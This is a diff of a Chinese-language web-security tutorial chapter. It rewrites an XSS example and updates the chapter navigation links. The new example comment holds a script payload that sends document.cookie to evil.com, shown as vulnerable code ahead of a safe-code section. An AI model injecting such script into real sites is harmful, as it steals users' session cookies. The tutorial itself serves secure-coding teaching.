@@ -256,8 +256,8 @@ cursor.execute(
 ```html
 <!-- 用户评论直接渲染到页面 -->
 <div>用户评论: ${userComment}</div>
-<!-- 如果 userComment = <script>document.cookie</script> -->
-<!-- 恶意脚本就会在其他用户浏览器中执行！ -->
+<!-- 如果 userComment = <script>fetch('https://evil.com?c='+document.cookie)</script> -->
+<!-- 恶意脚本就会在其他用户浏览器中执行，窃取 Cookie 发送给攻击者！ -->
 ```
 
 **✅ 安全代码：**
@@ -659,4 +659,4 @@ def search():
 
 ---
 
-[⬅️ 上一章：消息队列](../07-message-queues/README.md) | [➡️ 下一章：真实案例分析](../09-real-world/README.md)
+[⬅️ 上一章：通信协议](../07-communication/README.md) | [➡️ 下一章：系统设计案例](../09-system-design-cases/README.md)
